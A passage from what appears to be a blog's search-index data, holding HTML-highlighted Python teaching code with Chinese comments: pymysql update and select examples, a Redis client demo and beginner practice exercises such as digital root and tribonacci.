pymysql.connect(host=<span class=\"string\">&#x27;192.168.0.5&#x27;</span>, port=<span class=\"number\">3306</span>, user=<span class=\"string\">&#x27;root&#x27;</span>,</span><br><span class=\"line\">                           password=<span class=\"string\">&#x27;123456&#x27;</span>, db=<span class=\"string\">&#x27;school&#x27;</span>, charset=<span class=\"string\">&#x27;utf8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 2.获得游标对象</span></span><br><span class=\"line\">        <span class=\"keyword\">with</span> conn.cursor() <span class=\"keyword\">as</span> cursor:</span><br><span class=\"line\">            <span class=\"comment\"># 3.执行SQL得到结果</span></span><br><span class=\"line\">            result = cursor.execute(</span><br><span class=\"line\">                <span class=\"string\">&#x27;update tb_teacher set teatitle=%s where teaid=%s&#x27;</span>, (title, no))</span><br><span class=\"line\">                <span class=\"comment\"># &#x27;insert into tb_teacher values (1155, &quot;张翠山&quot;, &quot;教授&quot;, 3)&#x27;)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> result == <span class=\"number\">1</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;Operate success!&#x27;</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 4.操作成功执行提交</span></span><br><span class=\"line\">            conn.commit()</span><br><span class=\"line\">    <span class=\"keyword\">except</span> pymysql.MySQLError <span class=\"keyword\">as</span> error:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(error)</span><br><span class=\"line\">        <span class=\"comment\"># 5.操作失败执行回滚</span></span><br><span class=\"line\">        conn.rollback()</span><br><span class=\"line\">    <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 6.关闭连接释放资源</span></span><br><span class=\"line\">        conn.close()</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># print(conn)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"MySQL的select操作-py\"><a href=\"#MySQL的select操作-py\" class=\"headerlink\" title=\"MySQL的select操作.py\"></a>MySQL的select操作.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pymysql</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Teacher</span>(<span class=\"title class_ inherited__\">object</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, no, name, title</span>):</span><br><span class=\"line\">        self.no = no</span><br><span class=\"line\">        self.name = name</span><br><span class=\"line\">        self.title = title</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__str__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">f&#x27;<span class=\"subst\">&#123;self.no&#125;</span>\\t<span class=\"subst\">&#123;self.name&#125;</span>\\t<span class=\"subst\">&#123;self.title&#125;</span>&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    <span class=\"comment\"># 1.创建连接对象</span></span><br><span class=\"line\">    conn = pymysql.connect(host=<span class=\"string\">&#x27;192.168.0.5&#x27;</span>, port=<span class=\"number\">3306</span>, user=<span class=\"string\">&#x27;root&#x27;</span>,</span><br><span class=\"line\">                           password=<span class=\"string\">&#x27;123456&#x27;</span>, db=<span class=\"string\">&#x27;school&#x27;</span>, charset=<span class=\"string\">&#x27;utf8&#x27;</span>,</span><br><span class=\"line\">                           cursorclass=pymysql.cursors.DictCursor) <span class=\"comment\"># 字典型游标</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 2.获得游标对象</span></span><br><span class=\"line\">        <span class=\"keyword\">with</span> conn.cursor() <span class=\"keyword\">as</span> cursor:</span><br><span class=\"line\">            <span class=\"comment\"># 3.执行SQL得到结果</span></span><br><span class=\"line\">            cursor.execute(<span class=\"string\">&#x27;select teaid as no, teaname as name, &#x27;</span></span><br><span class=\"line\">                           <span class=\"string\">&#x27;teatitle as title from tb_teacher&#x27;</span>)</span><br><span class=\"line\">            <span class=\"comment\"># print(cursor.fetchone())</span></span><br><span class=\"line\">            <span class=\"comment\"># print(cursor.fetchmany(2))</span></span><br><span class=\"line\">            <span class=\"comment\"># print(cursor.fetchall())</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> cursor.fetchall():</span><br><span class=\"line\">                teacher = Teacher(**row)</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(teacher)</span><br><span class=\"line\">                <span class=\"comment\"># print(row[&#x27;no&#x27;], end=&#x27;\\t&#x27;)</span></span><br><span class=\"line\">                <span class=\"comment\"># print(row[&#x27;name&#x27;], end=&#x27;\\t&#x27;)</span></span><br><span class=\"line\">                <span class=\"comment\"># print(row[&#x27;title&#x27;])</span></span><br><span class=\"line\">                <span class=\"comment\"># print(f&#x27;teaid: &#123;row[0]&#125;&#x27;)</span></span><br><span class=\"line\">                <span class=\"comment\"># print(f&#x27;teaname: &#123;row[1]&#125;&#x27;)</span></span><br><span class=\"line\">                <span class=\"comment\"># print(f&#x27;teatitle: &#123;row[2]&#125;&#x27;)</span></span><br><span class=\"line\">                <span class=\"comment\"># print(&#x27;-&#x27;*20)</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> pymysql.MySQLError <span class=\"keyword\">as</span> error:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(error)</span><br><span class=\"line\">    <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 6.关闭连接释放资源</span></span><br><span class=\"line\">        conn.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Python程序操作Redis-py\"><a href=\"#Python程序操作Redis-py\" class=\"headerlink\" title=\"Python程序操作Redis.py\"></a>Python程序操作Redis.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> redis</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    client = redis.Redis(host=<span class=\"string\">&#x27;192.168.0.5&#x27;</span>, port=<span class=\"number\">6379</span>, password=<span class=\"string\">&#x27;123456&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># print(client)</span></span><br><span class=\"line\">    client.<span class=\"built_in\">set</span>(<span class=\"string\">&#x27;username&#x27;</span>, <span class=\"string\">&#x27;hellokitty&#x27;</span>, ex=<span class=\"number\">300</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(client.ttl(<span class=\"string\">&#x27;username&#x27;</span>))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(client.get(<span class=\"string\">&#x27;username&#x27;</span>).decode())</span><br><span class=\"line\">    client.<span class=\"built_in\">set</span>(<span class=\"string\">&#x27;nickname&#x27;</span>, <span class=\"string\">&#x27;洛&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(client.get(<span class=\"string\">&#x27;nickname&#x27;</span>).decode())</span><br><span class=\"line\">    client.<span class=\"built_in\">set</span>(<span class=\"string\">&#x27;yu&#x27;</span>, <span class=\"string\">&#x27;300&#x27;</span>)</span><br><span class=\"line\">    client.incr(<span class=\"string\">&#x27;yu&#x27;</span>)</span><br><span class=\"line\">    client.incrby(<span class=\"string\">&#x27;yu&#x27;</span>, <span class=\"number\">50</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(client.get(<span class=\"string\">&#x27;yu&#x27;</span>).decode())</span><br><span class=\"line\">    client.hset(<span class=\"string\">&#x27;stu1&#x27;</span>, <span class=\"string\">&#x27;id&#x27;</span>, <span class=\"string\">&#x27;1001&#x27;</span>)</span><br><span class=\"line\">    client.hset(<span class=\"string\">&#x27;stu1&#x27;</span>, <span class=\"string\">&#x27;name&#x27;</span>, <span class=\"string\">&#x27;chui&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(client.hgetall(<span class=\"string\">&#x27;stu1&#x27;</span>))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(client.hget(<span class=\"string\">&#x27;stu1&#x27;</span>, <span class=\"string\">&#x27;name&#x27;</span>).decode())</span><br><span class=\"line\">    client.rpush(<span class=\"string\">&#x27;list1&#x27;</span>, <span class=\"number\">10</span>, <span class=\"number\">20</span>, <span class=\"number\">30</span>, <span class=\"number\">40</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(client.lrange(<span class=\"string\">&#x27;list1&#x27;</span>, <span class=\"number\">0</span>, -<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># str</span></span><br><span class=\"line\"><span class=\"comment\"># bytes</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">报错解决方法</span></span><br><span class=\"line\"><span class=\"string\">--no bind address ...</span></span><br><span class=\"line\"><span class=\"string\">redis-server --bind [C IP] &gt; redis.log &amp;</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n","categories":["python"],"tags":["基础"]},{"title":"python练习","url":"/2022/08/17/python%E7%BB%83%E4%B9%A0/","content":"<h1 id=\"p1\"><a href=\"#p1\" class=\"headerlink\" title=\"p1\"></a>p1</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 有4个数字：1，2，3，4，能组成多少个互不相同且无重复数字的三位数？各是多少？</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># list1 = []</span></span><br><span class=\"line\"><span class=\"comment\"># for i in range(1,5):</span></span><br><span class=\"line\"><span class=\"comment\">#     for j in range(1,5):</span></span><br><span class=\"line\"><span class=\"comment\">#         if i != j:</span></span><br><span class=\"line\"><span class=\"comment\">#             for k in range(1,5):</span></span><br><span class=\"line\"><span class=\"comment\">#                 if k != i and k != j: # 或者 if (i != j) and (j != k) and (i != k)</span></span><br><span class=\"line\"><span class=\"comment\">#                     num = i*100+j*10+k</span></span><br><span class=\"line\"><span class=\"comment\">#                     list1.append(num)</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># tuple1 = tuple(list1)</span></span><br><span class=\"line\"><span class=\"comment\"># print(&#x27;number is:&#x27;, len(tuple1))</span></span><br><span class=\"line\"><span class=\"comment\"># for i in tuple1:</span></span><br><span class=\"line\"><span class=\"comment\">#     print(i)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;---------------------------------------------------------------------&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> functools <span class=\"keyword\">import</span> reduce</span><br><span class=\"line\"></span><br><span class=\"line\">filter_list1 = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"string\">&#x27;a&#x27;</span>,<span class=\"string\">&#x27;b&#x27;</span>]</span><br><span class=\"line\">filter_list2 = [<span class=\"number\">1</span>,<span class=\"string\">&#x27;a&#x27;</span>,<span class=\"string\">&#x27;b&#x27;</span>,<span class=\"number\">0</span>,<span class=\"number\">15</span>]</span><br><span class=\"line\">filter_list3 = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"string\">&#x27;aasf&#x27;</span>,<span class=\"string\">&#x27;1&#x27;</span>,<span class=\"string\">&#x27;123&#x27;</span>,<span class=\"number\">123</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">filter_list</span>(<span class=\"params\">l</span>):</span><br><span class=\"line\">    <span class=\"string\">&#x27;return a new list with the strings filtered out&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> [i <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> l <span class=\"keyword\">if</span> <span class=\"built_in\">type</span>(i) <span class=\"keyword\">is</span> <span class=\"built_in\">int</span>]</span><br><span class=\"line\">    <span class=\"comment\"># l1 = []</span></span><br><span class=\"line\">    <span class=\"comment\"># for i in l:</span></span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    <span class=\"comment\">#     if type(i) is int:</span></span><br><span class=\"line\">    <span class=\"comment\">#         l1.append(i)</span></span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    <span class=\"comment\"># return l1</span></span><br><span class=\"line\"></span><br><span class=\"line\">l11 = filter_list(filter_list1)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(l11)</span><br><span class=\"line\">l11 = filter_list(filter_list2)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(l11)</span><br><span class=\"line\">l11 = filter_list(filter_list3)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(l11)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;---------------------------------------------------------------------&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">digital_root</span>(<span class=\"params\">n</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># s1 = str(n)</span></span><br><span class=\"line\">    <span class=\"comment\"># if len(s1) &lt; 2:</span></span><br><span class=\"line\">    <span class=\"comment\">#     return n</span></span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    <span class=\"comment\"># else:</span></span><br><span class=\"line\">    <span class=\"comment\">#     n = 0</span></span><br><span class=\"line\">    <span class=\"comment\">#     for i in s1:</span></span><br><span class=\"line\">    <span class=\"comment\">#         n += int(i)</span></span><br><span class=\"line\">    <span class=\"comment\">#     return digital_root(n)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> n <span class=\"keyword\">if</span> n &lt; <span class=\"number\">10</span> <span class=\"keyword\">else</span> digital_root(<span class=\"built_in\">sum</span>(<span class=\"built_in\">map</span>(<span class=\"built_in\">int</span>, <span class=\"built_in\">str</span>(n))))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">n1 = digital_root(<span class=\"number\">493193</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(n1)</span><br><span class=\"line\"></span><br><span class=\"line\">n2 = digital_root(<span class=\"number\">132189</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(n2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;---------------------------------------------------------------------&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_sum</span>(<span class=\"params\">a,b</span>):</span><br><span class=\"line\">    <span class=\"comment\"># sum = 0</span></span><br><span class=\"line\">    <span class=\"comment\"># i = b</span></span><br><span class=\"line\">    <span class=\"comment\"># if a &gt; b:</span></span><br><span class=\"line\">    <span class=\"comment\">#     b = a</span></span><br><span class=\"line\">    <span class=\"comment\">#     a = i</span></span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    <span class=\"comment\"># for i in range(a,b+1):</span></span><br><span class=\"line\">    <span class=\"comment\">#     sum += i</span></span><br><span class=\"line\">    <span class=\"comment\"># return sum</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># return sum(i for i in range(b,a+1)) if a &gt; b else sum(i for i in range(a,b+1))</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">sum</span>(<span class=\"built_in\">range</span>(<span class=\"built_in\">min</span>(a, b), <span class=\"built_in\">max</span>(a, b) + <span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">s1 = get_sum(-<span class=\"number\">1</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(s1)</span><br><span class=\"line\">s1 = get_sum(<span class=\"number\">1</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(s1)</span><br><span class=\"line\">s1 = get_sum(<span class=\"number\">1</span>,<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(s1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;---------------------------------------------------------------------&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">binary_array_to_number</span>(<span class=\"params\">arr</span>):</span><br><span class=\"line\">    <span class=\"comment\"># l1 = len(arr)-1</span></span><br><span class=\"line\">    <span class=\"comment\"># sum = 0</span></span><br><span class=\"line\">    <span class=\"comment\"># for i in arr:</span></span><br><span class=\"line\">    <span class=\"comment\">#     sum += i*(2**l1)</span></span><br><span class=\"line\">    <span class=\"comment\">#     l1 -= 1</span></span><br><span class=\"line\">    <span class=\"comment\"># return sum</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># return sum(digit * 2 ** i for i, digit in enumerate(reversed(arr)))</span></span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    enumerate is useful</span></span><br><span class=\"line\"><span class=\"string\">    for obtaining an indexed list:</span></span><br><span class=\"line\"><span class=\"string\">        (0, seq[0]), (1, seq[1]), (2, seq[2]), ...</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># append_bit = lambda n, b: n &lt;&lt; 1 | b  # 二进制的逻辑或</span></span><br><span class=\"line\">    <span class=\"comment\"># return reduce(append_bit, arr)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">        For example, reduce(lambda x, y: x+y, [1, 2, 3, 4, 5]) calculates</span></span><br><span class=\"line\"><span class=\"string\">        ((((1+2)+3)+4)+5)</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">int</span>(<span class=\"string\">&quot;&quot;</span>.join(<span class=\"built_in\">map</span>(<span class=\"built_in\">str</span>, arr)), <span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">a1 = binary_array_to_number([<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(a1)</span><br><span class=\"line\">a1 = binary_array_to_number([<span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(a1)</span><br><span class=\"line\">a1 = binary_array_to_number([<span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(a1)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">int</span>(<span class=\"string\">&quot;1011&quot;</span>, <span class=\"number\">2</span>)) <span class=\"comment\"># 此处的参数2表示将2进制转成十进制</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">int</span>(<span class=\"string\">&quot;1011&quot;</span>, <span class=\"number\">8</span>))</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"p2\"><a href=\"#p2\" class=\"headerlink\" title=\"p2\"></a>p2</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 计算奖金：利润(I)=&lt; 10w, 奖金K可提%10I，10w &lt; I &lt;= 20, 低于10w部分10%，高于10w部分7.5%，</span></span><br><span class=\"line\"><span class=\"comment\"># 高于20w部分5%，40w - 3%，60w - 1.5%, 100w - 1%</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># I = int(input(&#x27;please input the profit: &#x27;))</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># if I &lt;= 100000:</span></span><br><span class=\"line\"><span class=\"comment\">#     K = I * 0.1</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># elif I &gt; 100000 and I &lt;= 200000:</span></span><br><span class=\"line\"><span class=\"comment\">#     K = 100000 * 0.1 + (I-100000) * 0.075</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># elif I &gt; 200000 and I &lt;= 400000:</span></span><br><span class=\"line\"><span class=\"comment\">#     K = 100000 * 0.1 + 100000 * 0.075 + (I-200000) * 0.05</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># elif I &gt; 400000 and I &lt;= 600000:</span></span><br><span class=\"line\"><span class=\"comment\">#     K = 100000 * 0.1 + 100000 * 0.075 + 200000 * 0.05 + (I-400000) * 0.03</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># elif I &gt; 600000 and I &lt;= 1000000:</span></span><br><span class=\"line\"><span class=\"comment\">#     K = 100000 * 0.1 + 100000 * 0.075 + 200000 * 0.05 + 200000 * 0.03 + (I-600000) * 0.015</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># else:</span></span><br><span class=\"line\"><span class=\"comment\">#     K = 100000 * 0.1 + 100000 * 0.075 + 200000 * 0.05 + 200000 * 0.03 + 400000 * 0.015 + (I-1000000) * 0.01</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># print(&#x27;Reward is:&#x27;, K)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># arr = [1000000, 600000, 400000, 200000, 100000, 0]</span></span><br><span class=\"line\"><span class=\"comment\"># rat = [0.01, 0.015, 0.03, 0.05, 0.075, 0.1]</span></span><br><span class=\"line\"><span class=\"comment\"># r = 0</span></span><br><span class=\"line\"><span class=\"comment\"># for idx in range(0, 6):</span></span><br><span class=\"line\"><span class=\"comment\">#     if I &gt; arr[idx]:</span></span><br><span class=\"line\"><span class=\"comment\">#         tmp = (I-arr[idx])*rat[idx]</span></span><br><span class=\"line\"><span class=\"comment\">#         r = r + tmp</span></span><br><span class=\"line\"><span class=\"comment\">#         I = arr[idx]</span></span><br><span class=\"line\"><span class=\"comment\"># print(r)</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> functools <span class=\"keyword\">import</span> reduce</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;-----------------------------------------------------------------&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solution</span>(<span class=\"params\">number</span>):</span><br><span class=\"line\">    <span class=\"built_in\">sum</span> = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> number &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,number):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (i % <span class=\"number\">3</span> == <span class=\"number\">0</span>) <span class=\"keyword\">or</span> (i % <span class=\"number\">5</span> == <span class=\"number\">0</span>):</span><br><span class=\"line\">            <span class=\"built_in\">sum</span> += i</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">sum</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sol1</span>(<span class=\"params\">number</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">sum</span>(i <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,number) <span class=\"keyword\">if</span> (i % <span class=\"number\">3</span> == <span class=\"number\">0</span>) <span class=\"keyword\">or</span> (i % <span class=\"number\">5</span> == <span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">n1 = solution(<span class=\"number\">15</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(n1)</span><br><span class=\"line\">n1 = sol1(<span class=\"number\">15</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(n1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;-----------------------------------------------------------------&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">narcissistic</span>(<span class=\"params\"> value </span>):</span><br><span class=\"line\">    <span class=\"comment\"># l1 = len(str(value))</span></span><br><span class=\"line\">    <span class=\"comment\"># sum = 0</span></span><br><span class=\"line\">    <span class=\"comment\"># for i in str(value):</span></span><br><span class=\"line\">    <span class=\"comment\">#     sum += int(i)**l1</span></span><br><span class=\"line\">    <span class=\"comment\"># if sum == value:</span></span><br><span class=\"line\">    <span class=\"comment\">#     return True</span></span><br><span class=\"line\">    <span class=\"comment\"># else:</span></span><br><span class=\"line\">    <span class=\"comment\">#     return False</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># return True if sum(int(i)**len(str(value)) for i in str(value)) == value else False</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> value == <span class=\"built_in\">sum</span>(<span class=\"built_in\">int</span>(x) ** <span class=\"built_in\">len</span>(<span class=\"built_in\">str</span>(value)) <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">str</span>(value))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">va1 = narcissistic(<span class=\"number\">153</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(va1)</span><br><span class=\"line\">va1 = narcissistic(<span class=\"number\">371</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(va1)</span><br><span class=\"line\">va1 = narcissistic(<span class=\"number\">7</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(va1)</span><br><span class=\"line\">va1 = narcissistic(<span class=\"number\">1652</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(va1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;-----------------------------------------------------------------&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">tribonacci</span>(<span class=\"params\">signature, n</span>):</span><br><span class=\"line\">    <span class=\"comment\"># index = 0</span></span><br><span class=\"line\">    <span class=\"comment\"># l1 = []</span></span><br><span class=\"line\">    <span class=\"comment\"># while len(signature) &lt; n:</span></span><br><span class=\"line\">    <span class=\"comment\">#     v1 = signature[index]+signature[index+1]+signature[index+2]</span></span><br><span class=\"line\">    <span class=\"comment\">#     signature.append(v1)</span></span><br><span class=\"line\">    <span class=\"comment\">#     index += 1</span></span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    <span class=\"comment\"># for i in range(n):</span></span><br><span class=\"line\">    <span class=\"comment\">#     l1.append(signature[i])</span></span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    <span class=\"comment\"># return l1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> signature[:n] <span class=\"keyword\">if</span> n &lt;= <span class=\"built_in\">len</span>(signature) <span class=\"keyword\">else</span> tribonacci(signature + [<span class=\"built_in\">sum</span>(signature[-<span class=\"number\">3</span>:])], n)</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = tribonacci([<span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>], <span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(list1)</span><br><span class=\"line\">list1 = tribonacci([<span class=\"number\">0.5</span>, <span class=\"number\">0.5</span>, <span class=\"number\">0.5</span>], <span class=\"number\">30</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(list1)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"p3\"><a href=\"#p3\" class=\"headerlink\" title=\"p3\"></a>p3</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">friend</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">list</span>(<span class=\"built_in\">filter</span>(<span class=\"keyword\">lambda</span> a: 